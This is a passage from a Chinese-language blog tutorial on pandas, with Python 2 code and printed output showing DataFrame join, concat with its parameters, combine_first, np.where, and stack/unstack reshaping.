12.0</span><br><span class="line">e   NaN     NaN      13.0     14.0</span><br><span class="line">   Ohio  Nevada  Missouri  Alabama</span><br><span class="line">a   1.0     2.0       NaN      NaN</span><br><span class="line">a   5.0     6.0       NaN      NaN</span><br><span class="line">b   NaN     NaN       7.0      8.0</span><br><span class="line">c   3.0     4.0       9.0     10.0</span><br><span class="line">d   NaN     NaN      11.0     12.0</span><br><span class="line">e   NaN     NaN      13.0     14.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数DF的索引和调用者DF的某一列连接</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> left1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> right1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> left1.join(right1, on = <span class="string">'key'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  key  value</span><br><span class="line">0   a      0</span><br><span class="line">1   b      1</span><br><span class="line">2   a      2</span><br><span class="line">3   a      3</span><br><span class="line">4   b      4</span><br><span class="line">5   c      5</span><br><span class="line"></span><br><span class="line">   group_val</span><br><span class="line">a        3.5</span><br><span class="line">b        7.0</span><br><span class="line"></span><br><span class="line">  key  value  group_val</span><br><span class="line">0   a      0        3.5</span><br><span class="line">1   b      1        7.0</span><br><span class="line">2   a      2        3.5</span><br><span class="line">3   a      3        3.5</span><br><span class="line">4   b      4        7.0</span><br><span class="line">5   c      5        NaN</span><br></pre></td></tr></table></figure>
</li>
<li><p>几个DF索引合并</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">another = pd.DataFrame([[<span class="number">7</span>,<span class="number">8</span>], [<span class="number">9</span>, <span class="number">10</span>], [<span class="number">11</span>, <span class="number">12</span>], [<span class="number">16</span>, <span class="number">17</span>]],</span><br><span class="line">                       index = [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>],</span><br><span class="line">                       columns = [<span class="string">"new York"</span>, <span class="string">"Oregon"</span>])</span><br><span class="line"><span class="keyword">print</span> left2.join([right2, another])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> left2.join([right2, another], how = <span class="string">'outer'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   Ohio  Nevada  Missouri  Alabama  new York  Oregon</span><br><span class="line">a   1.0     2.0       NaN      NaN       7.0     8.0</span><br><span class="line">a   5.0     6.0       NaN      NaN       7.0     8.0</span><br><span class="line">b   NaN     NaN       7.0      8.0       NaN     NaN</span><br><span class="line">c   3.0     4.0       9.0     10.0       9.0    10.0</span><br><span class="line">d   NaN     NaN      11.0     12.0       NaN     NaN</span><br><span class="line">e   NaN     NaN      13.0     14.0      11.0    12.0</span><br><span class="line">f   NaN     NaN       NaN      NaN      16.0    17.0</span><br><span class="line"></span><br><span class="line">   Ohio  Nevada  Missouri  Alabama  new York  Oregon</span><br><span class="line">a   1.0     2.0       NaN      NaN       7.0     8.0</span><br><span class="line">a   5.0     6.0       NaN      NaN       7.0     8.0</span><br><span class="line">b   NaN     NaN       7.0      8.0       NaN     NaN</span><br><span class="line">c   3.0     4.0       9.0     10.0       9.0    10.0</span><br><span class="line">d   NaN     NaN      11.0     12.0       NaN     NaN</span><br><span class="line">e   NaN     NaN      13.0     14.0      11.0    12.0</span><br><span class="line">f   NaN     NaN       NaN      NaN      16.0    17.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="轴向连接"><a href="#轴向连接" class="headerlink" title="轴向连接"></a>轴向连接</h3><ol>
<li><p>concatenation函数（合并原始Numpy数组）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arr = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> arr</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> np.concatenate([arr,arr], axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[[ 0  1  2  3]</span><br><span class="line"> [ 4  5  6  7]</span><br><span class="line"> [ 8  9 10 11]]</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[[ 0  1  2  3  0  1  2  3]</span><br><span class="line"> [ 4  5  6  7  4  5  6  7]</span><br><span class="line"> [ 8  9 10 11  8  9 10 11]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>pandas中的连接</p>
<ol>
<li><p>需要考虑的因素</p>
<ul>
<li>如果个对象其他轴上的索引不同， 那些轴应该是做并集还是交集</li>
<li>结果对象中的分组需要各不相同吗</li>
<li>用于连接的轴重要吗</li>
</ul>
</li>
<li><p>concat函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s1 = pd.Series([<span class="number">0</span>,<span class="number">1</span>], index = [<span class="string">'a'</span>, <span class="string">'b'</span>])</span><br><span class="line">s2 = pd.Series([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], index = list(<span class="string">'cde'</span>))</span><br><span class="line">s3 = pd.Series([<span class="number">5</span>, <span class="number">6</span>], index = [<span class="string">'f'</span>, <span class="string">'g'</span>])</span><br><span class="line"><span class="keyword">print</span> s1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> s2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> s3</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#concat默认在axis = 0下工作，返回一个Series</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([s1, s2, s3])</span><br><span class="line"></span><br><span class="line"><span class="comment">#在axis = 1上作用，会变成一个DF</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([s1, s2, s3], axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a    0</span><br><span class="line">b    1</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">c    2</span><br><span class="line">d    3</span><br><span class="line">e    4</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">f    5</span><br><span class="line">g    6</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">a    0</span><br><span class="line">b    1</span><br><span class="line">c    2</span><br><span class="line">d    3</span><br><span class="line">e    4</span><br><span class="line">f    5</span><br><span class="line">g    6</span><br><span class="line">dtype: int64</span><br><span class="line">     0    1    2</span><br><span class="line">a  0.0  NaN  NaN</span><br><span class="line">b  1.0  NaN  NaN</span><br><span class="line">c  NaN  2.0  NaN</span><br><span class="line">d  NaN  3.0  NaN</span><br><span class="line">e  NaN  4.0  NaN</span><br><span class="line">f  NaN  NaN  5.0</span><br><span class="line">g  NaN  NaN  6.0</span><br></pre></td></tr></table></figure>
<ol>
<li><p>Cconcet 默认外连接, join和 join~axes参数~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s4 = pd.concat([s1 *<span class="number">5</span>, s3])</span><br><span class="line"><span class="keyword">print</span> s4</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pd.concat([s1, s4], axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用内连接</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([s1, s4], join = <span class="string">'inner'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定要在其他州上使用的索引</span></span><br><span class="line"><span class="comment">#s4的f g行就消失了，多了 c e行</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([s1, s4], axis = <span class="number">1</span>, join_axes = [[<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>, <span class="string">'e'</span>]]) <span class="comment">#join_axes是list里有索引list</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a    0</span><br><span class="line">b    5</span><br><span class="line">f    5</span><br><span class="line">g    6</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">     0  1</span><br><span class="line">a  0.0  0</span><br><span class="line">b  1.0  5</span><br><span class="line">f  NaN  5</span><br><span class="line">g  NaN  6</span><br><span class="line"></span><br><span class="line">a    0</span><br><span class="line">b    1</span><br><span class="line">a    0</span><br><span class="line">b    5</span><br><span class="line">f    5</span><br><span class="line">g    6</span><br><span class="line">dtype: int64</span><br><span class="line">     0    1</span><br><span class="line">a  0.0  0.0</span><br><span class="line">c  NaN  NaN</span><br><span class="line">b  1.0  5.0</span><br><span class="line">e  NaN  NaN</span><br></pre></td></tr></table></figure>
</li>
<li><p>创造层次化， key参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#key参数 将三个Series分层</span></span><br><span class="line">result = pd.concat([s1, s2, s3], keys = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>])</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unstack 将分层的Series变成DF</span></span><br><span class="line"><span class="keyword">print</span> result.unstack()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#沿着axis = 1对Series进行合并，keys变成DataFrame的列头</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"就是上面的行列置换:"</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([s1, s2, s3], axis = <span class="number">1</span>, keys = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">one    a    0</span><br><span class="line">       b    1</span><br><span class="line">two    c    2</span><br><span class="line">       d    3</span><br><span class="line">       e    4</span><br><span class="line">three  f    5</span><br><span class="line">       g    6</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">         a    b    c    d    e    f    g</span><br><span class="line">one    0.0  1.0  NaN  NaN  NaN  NaN  NaN</span><br><span class="line">two    NaN  NaN  2.0  3.0  4.0  NaN  NaN</span><br><span class="line">three  NaN  NaN  NaN  NaN  NaN  5.0  6.0</span><br><span class="line"></span><br><span class="line">就是上面的行列置换</span><br><span class="line">   one  two  three</span><br><span class="line">a  0.0  NaN    NaN</span><br><span class="line">b  1.0  NaN    NaN</span><br><span class="line">c  NaN  2.0    NaN</span><br><span class="line">d  NaN  3.0    NaN</span><br><span class="line">e  NaN  4.0    NaN</span><br><span class="line">f  NaN  NaN    5.0</span><br><span class="line">g  NaN  NaN    6.0</span><br></pre></td></tr></table></figure>
<ol>
<li><p>DF中的层次化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(np.arange(<span class="number">6</span>).reshape(<span class="number">3</span>,<span class="number">2</span>), index = list(<span class="string">'abc'</span>),</span><br><span class="line">                   columns = [<span class="string">'one'</span>, <span class="string">'two'</span>])</span><br><span class="line">df2 = pd.DataFrame(<span class="number">5</span>+ np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>,<span class="number">2</span>), index = [<span class="string">'a'</span>, <span class="string">'c'</span>],</span><br><span class="line">                    columns = [<span class="string">'three'</span>, <span class="string">'four'</span>])</span><br><span class="line"><span class="keyword">print</span> pd.concat([df1, df2], axis = <span class="number">1</span>, keys = [<span class="string">'level1'</span>, <span class="string">'level2'</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数如果不是列表是字典，则字典的key会当成keys的值，value会是做对应的对象</span></span><br><span class="line"><span class="keyword">print</span> pd.concat(&#123;<span class="string">'level1'</span>: df1, <span class="string">'level2'</span> : df2&#125;, axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  level1     level2</span><br><span class="line">     one two  three four</span><br><span class="line">a      0   1    5.0  6.0</span><br><span class="line">b      2   3    NaN  NaN</span><br><span class="line">c      4   5    7.0  8.0</span><br><span class="line"></span><br><span class="line">  level1     level2</span><br><span class="line">     one two  three four</span><br><span class="line">a      0   1    5.0  6.0</span><br><span class="line">b      2   3    NaN  NaN</span><br><span class="line">c      4   5    7.0  8.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>忽略行索引， ignore~index参数~</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(np.random.randn(<span class="number">3</span>,<span class="number">4</span>), columns = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</span><br><span class="line">df2 = pd.DataFrame(np.random.randn(<span class="number">2</span>,<span class="number">3</span>), columns = [<span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'a'</span>])</span><br><span class="line"><span class="keyword">print</span> df1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#传入ignore_index = True来忽略行索引</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([df1, df2], ignore_index = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"如果不传入ignore_index的话"</span></span><br><span class="line"><span class="keyword">print</span> pd.concat([df1, df2])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">          a         b         c         d</span><br><span class="line">0  1.135556  0.913366 -0.343349 -0.552474</span><br><span class="line">1 -0.092713 -0.396608  0.862300  0.676480</span><br><span class="line">2 -0.489371 -0.738190 -0.706639  0.545143</span><br><span class="line"></span><br><span class="line">          b        d         a</span><br><span class="line">0  0.318872  1.53383 -1.174550</span><br><span class="line">1  1.939470 -1.25647 -0.083473</span><br><span class="line"></span><br><span class="line">          a         b         c         d</span><br><span class="line">0  1.135556  0.913366 -0.343349 -0.552474</span><br><span class="line">1 -0.092713 -0.396608  0.862300  0.676480</span><br><span class="line">2 -0.489371 -0.738190 -0.706639  0.545143</span><br><span class="line">3 -1.174550  0.318872       NaN  1.533830</span><br><span class="line">4 -0.083473  1.939470       NaN -1.256470</span><br><span class="line"></span><br><span class="line">如果不传入ignore_index的话</span><br><span class="line">          a         b         c         d</span><br><span class="line">0  1.135556  0.913366 -0.343349 -0.552474</span><br><span class="line">1 -0.092713 -0.396608  0.862300  0.676480</span><br><span class="line">2 -0.489371 -0.738190 -0.706639  0.545143</span><br><span class="line">0 -1.174550  0.318872       NaN  1.533830</span><br><span class="line">1 -0.083473  1.939470       NaN -1.256470</span><br></pre></td></tr></table></figure>
</li>
<li><p>concat函数的参数</p>
<p>|    参数               |      说明                                              |<br>|—————————-|——————————————————————————|<br>| objs              | 参与连接的对象列表或者字典。                       |<br>|                   | 唯一必要的参数                                     |<br>| axis              | 指明连接的轴向，默认为0                            |<br>| join              | “inner” “outer” 默认为”outer”                      |<br>| join~axes~        | 指明用于其他n-1条轴的索引                          |<br>|                   | 不执行并集/交集运算                                |<br>| keys              | 与连接对象有关的值，用于形成层次化索引             |<br>|                   | 可以使任意值的列表或数组，元组，数组列表           |<br>| levels            | 指定用于层次化索引各级上的索引，如果设置了keys     |<br>| names             | 用于创造分层级别的名字，如果设置了keys和(或)levels |<br>| verify~integrity~ | 检查见过对象新轴上的重复情况，如果发现则引起异常   |<br>|                   | 默认为(false)允许重复                              |<br>| ignore~index~     | 不保留连接轴上的索引                               |<br>|                   | 产生一组新索引range(total~length~)                 |</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="合并重叠数据"><a href="#合并重叠数据" class="headerlink" title="合并重叠数据"></a>合并重叠数据</h3><ol>
<li><p>使用Numpy的where函数，用于表达矢量化的if-else</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = pd.Series([np.nan, <span class="number">2.5</span>, np.nan, <span class="number">3.5</span>, <span class="number">4.5</span>, np.nan],</span><br><span class="line">              index = list (<span class="string">'fedcba'</span>))</span><br><span class="line">b = pd.Series(np.arange(len(a)), dtype = np.float64,</span><br><span class="line">              index = list(<span class="string">'fedcba'</span>))</span><br><span class="line">b[<span class="number">-1</span>] = np.nan</span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> b</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> np.where(pd.isnull(a), b, a )</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f    NaN</span><br><span class="line">e    2.5</span><br><span class="line">d    NaN</span><br><span class="line">c    3.5</span><br><span class="line">b    4.5</span><br><span class="line">a    NaN</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">f    0.0</span><br><span class="line">e    1.0</span><br><span class="line">d    2.0</span><br><span class="line">c    3.0</span><br><span class="line">b    4.0</span><br><span class="line">a    NaN</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">[ 0.   2.5  2.   3.5  4.5  nan]</span><br></pre></td></tr></table></figure>
</li>
<li><p>Series的combine~first方法~，会进行数据对齐?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> a.combine_first(b)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f    0.0</span><br><span class="line">e    2.5</span><br><span class="line">d    2.0</span><br><span class="line">c    3.5</span><br><span class="line">b    4.5</span><br><span class="line">a    NaN</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于 DF，combine~first~，对缺失值”打补丁”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(&#123;<span class="string">'a'</span>: [<span class="number">1</span>, np.nan, <span class="number">5</span>, np.nan],</span><br><span class="line">                    <span class="string">'b'</span>: [np.nan, <span class="number">2</span>, np.nan, <span class="number">6</span>],</span><br><span class="line">                    <span class="string">"c"</span>: range(<span class="number">2</span>, <span class="number">18</span>, <span class="number">4</span>)&#125;)</span><br><span class="line">df2 = pd.DataFrame(&#123;<span class="string">'a'</span>: [<span class="number">5</span>, <span class="number">4</span>, np.nan, <span class="number">3</span>, <span class="number">7</span>],</span><br><span class="line">                    <span class="string">'b'</span>: [np.nan, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> df1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> df1.combine_first(df2)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">     a    b   c</span><br><span class="line">0  1.0  NaN   2</span><br><span class="line">1  NaN  2.0   6</span><br><span class="line">2  5.0  NaN  10</span><br><span class="line">3  NaN  6.0  14</span><br><span class="line"></span><br><span class="line">     a    b</span><br><span class="line">0  5.0  NaN</span><br><span class="line">1  4.0  3.0</span><br><span class="line">2  NaN  4.0</span><br><span class="line">3  3.0  6.0</span><br><span class="line">4  7.0  8.0</span><br><span class="line"></span><br><span class="line">     a    b     c</span><br><span class="line">0  1.0  NaN   2.0</span><br><span class="line">1  4.0  2.0   6.0</span><br><span class="line">2  5.0  4.0  10.0</span><br><span class="line">3  3.0  6.0  14.0</span><br><span class="line">4  7.0  8.0   NaN</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="重塑和轴向旋转"><a href="#重塑和轴向旋转" class="headerlink" title="重塑和轴向旋转"></a>重塑和轴向旋转</h2><h3 id="重塑层次化索引"><a href="#重塑层次化索引" class="headerlink" title="重塑层次化索引"></a>重塑层次化索引</h3><ol>
<li><p>层次化索引为DF数据的重排提供了一种良好的一致性方式</p>
<ul>
<li>stack: 将数据的列”旋转”为行</li>
<li>unstack: 将数据的行”旋转”为列</li>
</ul>
<ol>
<li><p>例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要增加name,所以用 pd.Index</span></span><br><span class="line">data = pd.DataFrame(np.arange(<span class="number">6</span>).reshape(<span class="number">2</span>,<span class="number">3</span>),</span><br><span class="line">                    index = pd.Index([<span class="string">'Ohio'</span>, <span class="string">'Colorado'</span>], name = <span class="string">'state'</span>),</span><br><span class="line">                    columns = pd.Index([<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>], name = <span class="string">'number'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用stack来将列转化成行，得到一个层次化的Series</span></span><br><span class="line">result = data.stack()</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#对于一个层次化的Series，用unstack将其重排为一个DataFrame</span></span><br><span class="line"><span class="keyword">print</span> result.unstack()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">number    one  two  three</span><br><span class="line">state</span><br><span class="line">Ohio        0    1      2</span><br><span class="line">Colorado    3    4      5</span><br><span class="line"></span><br><span class="line">state     number</span><br><span class="line">Ohio      one       0</span><br><span class="line">          two       1</span><br><span class="line">          three     2</span><br><span class="line">Colorado  one       3</span><br><span class="line">          two       4</span><br><span class="line">          three     5</span><br><span class="line">dtype: int32</span><br><span class="line">number    one  two  three</span><br><span class="line">state</span><br><span class="line">Ohio        0    1      2</span><br><span class="line">Colorado    3    4      